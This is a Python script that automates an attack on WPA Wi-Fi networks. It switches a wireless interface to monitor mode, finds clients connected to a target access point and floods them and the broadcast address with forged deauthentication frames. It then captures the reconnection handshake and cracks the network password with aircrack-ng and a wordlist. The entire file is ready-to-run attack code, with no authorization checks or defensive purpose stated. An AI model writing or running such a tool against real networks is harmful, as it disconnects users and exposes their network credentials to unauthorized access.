import os
import subprocess
import re
import time
import shutil
from scapy.all import *
from scapy.layers.dot11 import *

def setup_network()->None:
    print(f"[!] Setting up network interface to allow for WiFi attacks...")
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout = subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'start', 'wlan1'], stdout = subprocess.DEVNULL)

def teardown_network()->None:
    print(f"[!] Reverting back network interface changes...")
    subprocess.run(['airmon-ng', 'stop', 'wlan1mon'], stdout = subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', 'wlan1', 'down'], stdout = subprocess.DEVNULL)
    subprocess.run(['iw', 'wlan1', 'set', 'type', 'managed'], stdout = subprocess.DEVNULL)
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout = subprocess.DEVNULL)

def get_iface()->str:
    try:
        result = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'mon' in line:
                match = re.search(r'^\d+:\s+([^:]+):', line)
                if match:
                    return match.group(1).strip()
    except Exception as e:
        print(f"[-] Error: {e}")
    return None

def get_local_devices(target_bssid: str, channel: int) -> list:
    """Get connected clients by scanning on the target channel"""
    i_face = get_iface()
    
    # Set channel to target AP's channel
    subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
    
    # Scan for clients for 30 seconds
    scan_file = f"/tmp/scan_{int(time.time())}"
    airodump_cmd = ['airodump-ng', '--bssid', target_bssid, '-c', str(channel), 
                    '-w', scan_file, '--output-format', 'csv', i_face]
    
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(30)
    airodump_proc.terminate()
    
    clients = []
    csv_file = f"{scan_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r') as f:
            lines = f.readlines()
        
        # Parse CSV to find clients (lines after "Station" line)
        station_section = False
        for line in lines:
            if 'Station' in line:
                station_section = True
                continue
            if station_section and line.strip() and ',' in line:
                parts = line.split(',')
                if len(parts) > 0:
                    mac = parts[0].strip().upper()
                    if mac and mac != target_bssid.upper():
                        clients.append(mac)
    
    # Cleanup
    os.system(f"rm -f {scan_file}*")
    
    if not clients:
        print("[-] No clients found. You may need to wait longer or there are no connected devices")
    
    return clients

def send_deauth(bssid: str, client_list: list, channel: int, iface: str)-> None:
    """Send deauth packets to disconnect clients"""
    # Ensure we're on the correct channel
    subprocess.run(['iwconfig', iface, 'channel', str(channel)])
    time.sleep(1)
    
    for client in client_list:
        print(f"[*] Deauthing client: {client}")
        # Send deauth from AP to client (disconnect client)
        packet = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=35, iface=iface, verbose=False)
        
        # Also send broadcast deauth to disconnect all clients
        broadcast = "FF:FF:FF:FF:FF:FF"
        packet = RadioTap()/Dot11(addr1=broadcast, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=10, iface=iface, verbose=False)

def capture_handshake(bssid: str, channel: int, ssid: str, client_list: list, iface: str)-> str:
    """Capture WPA handshake"""
    
    os.makedirs('./handshake', exist_ok=True)
    capture_file = f"./handshake/handshake-{ssid}-{bssid.replace(':', '')}"
    
    # Kill any existing airodump-ng processes
    subprocess.run(['killall', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Start airodump-ng to capture handshake
    airodump_cmd = ['airodump-ng', '--bssid', bssid, '-c', str(channel), 
                    '-w', capture_file, '--output-format', 'pcap', iface]
    
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    
    # Send deauth packets
    send_deauth(bssid, client_list, channel, iface)
    
    # Wait for client to reconnect and capture handshake
    print("[*] Waiting for client to reconnect and handshake capture...")
    time.sleep(20)
    
    # Check if handshake was captured
    handshake_detected = False
    cap_file = f"{capture_file}-01.cap"
    
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
        try:
            # Use aircrack-ng to verify handshake
            verify_cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(verify_cmd, capture_output=True, text=True)
            
            if '1 handshake' in result.stdout or '1 handshake' in result.stderr:
                handshake_detected = True
                print("[+] Valid handshake captured!")
            else:
                # Manual check
                packets = rdpcap(cap_file)
                eapol_count = sum(1 for p in packets if EAPOL in p)
                if eapol_count >= 2:
                    handshake_detected = True
                    print(f"[+] Handshake detected! ({eapol_count} EAPOL packets)")
        except Exception as e:
            print(f"[-] Error checking handshake: {e}")
    
    airodump_proc.terminate()
    time.sleep(2)
    
    if handshake_detected:
        return cap_file
    else:
        print("[-] No valid handshake captured")
        return None

def crack_handshake_aircrack(pcap_file: str, wordlist: str) -> str:
    """Crack the handshake using aircrack-ng"""
    print(f"\n[*] Attempting to crack the handshake, this might take a while...")
    print(f"[*] Wordlist: {wordlist}")
    
    cmd = ['aircrack-ng', '-w', wordlist, pcap_file]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        
        # Look for KEY FOUND pattern
        for line in output.splitlines():
            if 'KEY FOUND' in line or 'PASSWORD' in line.upper():
                # Extract password from brackets
                match = re.search(r'\[\s*([^\]]+)\s*\]', line)
                if match:
                    password = match.group(1).strip()
                    print(f"[+] PASSWORD FOUND: {password}")
                    return password
            elif 'Password:' in line or 'passphrase:' in line.lower():
                match = re.search(r'Password:\s*(\S+)|passphrase:\s*(\S+)', line, re.IGNORECASE)
                if match:
                    password = match.group(1) or match.group(2)
                    print(f"[+] PASSWORD FOUND: {password}")
                    return password
        
        print("\n[-] Password not found in wordlist")
        return None
        
    except subprocess.TimeoutExpired:
        print("[-] aircrack-ng timed out")
        return None
    except Exception as e:
        print(f"[-] Error running aircrack-ng: {e}")
        return None

def handshake_attack(bssid: str, channel: int, ssid: str, client_list: list, wordlist_path: str) -> str:
    """Perform handshake attack"""
    print(f"\n{'='*60}")
    print(f"Starting Handshake Attack on {ssid} ({bssid})")
    print(f"{'='*60}\n")
    
    setup_network()
    
    iface = get_iface()
    if not iface:
        print("[-] Could not find monitor interface")
        teardown_network()
        return None
    
    # If no clients provided, scan for them
    if not client_list:
        print("[*] No clients provided, scanning for connected clients...")
        client_list = get_local_devices(bssid, channel)
    
    if not client_list:
        print("[!] No clients found. Trying broadcast deauth anyway...")
        client_list = ["FF:FF:FF:FF:FF:FF"]
    
    print(f"[*] Will attempt to deauth {len(client_list)} client(s)")
    
    # Capture handshake
    pcap_file = capture_handshake(bssid, channel, ssid, client_list, iface)
    
    if not pcap_file:
        print("[-] Handshake capture failed")
        teardown_network()
        return None
    
    # Crack the handshake
    password = crack_handshake_aircrack(pcap_file, wordlist_path)
    
    # Cleanup
    teardown_network()
    if os.path.exists('handshake'):
        shutil.rmtree('handshake', ignore_errors=True)
    
    return password